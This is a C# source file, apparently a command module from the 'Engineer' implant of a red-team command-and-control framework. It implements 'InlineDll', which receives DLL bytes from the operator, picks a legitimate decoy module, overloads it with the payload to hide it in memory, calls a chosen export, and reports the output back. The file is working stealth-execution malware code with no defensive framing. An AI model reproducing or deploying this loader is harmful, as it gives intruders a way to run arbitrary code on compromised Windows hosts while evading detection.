using Engineer.Commands;
using Engineer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Policy;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;
using Engineer.Functions;

namespace Engineer.Commands
{
    internal class InlineDll : EngineerCommand
    {
        public override string Name => "InlineDll";

        public override async Task Execute(EngineerTask task)
        {
            try
            {
                if (task.File.Length < 1)
                {
                    Tasking.FillTaskResults("Error: /dll argument not found, please include the path to the dll to load, it should be present on the ts",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                if (!task.Arguments.TryGetValue("/function", out string export))
                {
                    Tasking.FillTaskResults("Error: /function argument not found, this is the exported function of the dll to call",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                task.Arguments.TryGetValue("/args", out string args);
                args = args.TrimStart(' ');
                export = export.TrimStart(' ');

                byte[] dllBytes = task.File;
                //Console.WriteLine($"got {dllBytes.Length} bytes");

                //uses dinvoke to map and load any dll, and execute desired functions.
                // find a decoy
                var decoy = reprobate.FindDecoyModule(dllBytes.Length);

                if (string.IsNullOrWhiteSpace(decoy))
                {
                    Tasking.FillTaskResults("Error: No suitable decoy found",task,EngTaskStatus.FailedWithWarnings,TaskResponseType.String);
                    return;
                }
                Tasking.FillTaskResults($"found decoy to overload module", task, EngTaskStatus.Running,TaskResponseType.String);
                //Console.WriteLine("found decoy trying to overload module");
                // map the module
                var map = reprobate.OverloadModule(dllBytes, decoy);
                //Console.WriteLine("module overloaded");
                object[] parameters = new object[] { args };

                // run
                Tasking.FillTaskResults($"executing dll", task, EngTaskStatus.Running,TaskResponseType.String);
                //Console.WriteLine("executing dll");
                var result = (string)reprobate.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(WinApiDynamicDelegate.GenericDelegate), parameters);

                // return output
                Tasking.FillTaskResults(result,task,EngTaskStatus.Complete,TaskResponseType.String);
            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
                //Console.WriteLine(ex.StackTrace);
                Tasking.FillTaskResults(ex.Message,task,EngTaskStatus.Failed,TaskResponseType.String);
            }
        }
    }
}
